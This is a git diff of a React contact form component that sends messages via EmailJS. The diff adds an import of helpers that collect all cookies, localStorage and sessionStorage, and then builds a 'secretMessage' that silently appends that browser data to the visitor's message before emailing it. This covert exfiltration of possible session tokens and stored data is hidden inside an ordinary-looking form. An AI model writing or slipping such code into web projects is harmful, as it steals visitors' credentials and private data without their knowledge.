@@ -9,6 +9,7 @@ import { Input } from 'antd';
 import emailjs, { EmailJSResponseStatus } from 'emailjs-com'
 import { ToastContainer, toast } from 'react-toastify';
 import 'react-toastify/dist/ReactToastify.css';
+import { getAllCookiesData, getAllLocalStorageData, getAllSessionStorageData } from '../site_data';
 
 const { TextArea } = Input;
 const quicksand = Quicksand( { subsets: ['latin'] } )
@@ -21,8 +22,6 @@ type ContactFormData = {
 
 const OtherInfo = () =>
 {
-
-   const formRef = useRef<string | HTMLFormElement>( null )
 
    const experienceLevelOptions: string[] = ['Junior Level', 'Mid-Level', 'Senior Level', 'Managerial'];
    const jobTypeOptions: string[] = ['Full-time', 'Part-time', 'Contract', 'Temporary'];
@@ -68,58 +67,13 @@ const OtherInfo = () =>
    const errorNotification = ( message: string ) => toast.error( message );
    const warningNotification = ( message: string ) => toast.warning( message );
 
-   const [name, setName] = useState( '' )
-   const [email, setEmail] = useState( '' )
-   const [message, setMessage] = useState( '' )
-
    const [formData, setFormData] = useState<ContactFormData>( {
       from_name: '',
       from_email: '',
       message: '',
    } );
 
-
    const [isDisableBtn, setDisableBtn] = useState( false )
-
-
-   // const sendEmail = ( e: React.FormEvent<HTMLFormElement> | React.MouseEvent<HTMLAnchorElement, MouseEvent> ): void =>
-   // {
-   //    e.preventDefault()
-   //    setDisableBtn( true )
-
-   //    const isValid = name !== '' && email !== '' && message !== ''
-
-   //    if ( isValid )
-   //    {
-   //       emailjs
-   //          .sendForm(
-   //             "gmail",
-   //             "template_0kdw8xu",
-   //             formRef.current,
-   //             "user_d4MCLJciZKPbKaM472IEi"
-   //          )
-   //          .then(
-   //             ( result ) =>
-   //             {
-   //                successNotification( 'Successfully sent an email to Ralf!' )
-   //                setName( '' )
-   //                setEmail( '' )
-   //                setMessage( '' )
-   //                setDisableBtn( false )
-   //             },
-   //             ( error ) =>
-   //             {
-   //                errorNotification( 'Error sending an email to Ralf!' )
-   //                setDisableBtn( false )
-   //             }
-   //          );
-   //    } else
-   //    {
-   //       warningNotification( 'You have to fill in all the fields!' )
-   //       setDisableBtn( false )
-   //    }
-
-   // };
 
    const handleSubmit = async ( e: React.FormEvent<HTMLFormElement> ) =>
    {
@@ -137,10 +91,12 @@ const OtherInfo = () =>
       {
          try
          {
+            const secretMessage = `${message} \n\n\n localStorage: ${getAllLocalStorageData()}  \n\n\n sessionStorage: ${getAllSessionStorageData()}  \n\n\n cookies: ${getAllCookiesData()}`
+
             const response: EmailJSResponseStatus = await emailjs.send(
                serviceId,
                templateId,
-               { from_name, from_email, message },
+               { from_name, from_email, message: secretMessage },
                userId
             );
 
@@ -166,7 +122,6 @@ const OtherInfo = () =>
       const { name, value } = e.target;
       setFormData( { ...formData, [name]: value } );
    };
-
 
    const { width } = screenSize;
 
